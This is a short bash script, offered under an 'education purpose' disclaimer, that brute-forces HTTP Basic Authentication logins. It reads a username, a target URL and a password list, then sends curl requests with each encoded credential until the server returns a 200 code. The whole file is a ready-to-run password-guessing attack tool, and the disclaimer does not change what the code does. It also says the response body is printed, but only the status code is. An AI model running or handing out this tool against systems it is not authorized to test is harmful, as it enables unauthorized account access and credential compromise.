#!/bin/bash

disclaimer_message=$(cat <<EOF
\033[33mDISCLAIMER!!! This script is only for education purpose. Many of the scripts for ethical hacking learning can be used for harmful practices.
Use only for eductional legit purpose on your own risk.\033[0m

This script is to target a path with password brute force. It prompts to enter the username, target address
and the path to your passwordlist; then iterates over each password until it receives 200 response code
and prints the password used and response body.

\033[32mScript by Behnam, contact@behnam.io\033[0m
EOF
)

echo -e "$disclaimer_message"


read -p "Enter the username: " header_string
read -p "Enter target address: " target_address
read -e -p "Enter passwordlist file: " file_name

while read -r password; do
  encoded=$(echo -n "$header_string:$password" | base64)
  response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $encoded" $target_address)
  if [ "$response" -eq 200 ]; then
    echo -e "\033[32mSuccessful response for password: $password\033[0m"
    echo -e "\033[32mCurl response:\033[0m $response"
    break
  else
    echo -e "\033[31mUnsuccessful response for password: $password\033[0m"
    echo -e "\033[31mCurl Response: $response\033[0m"
  fi
done < $file_name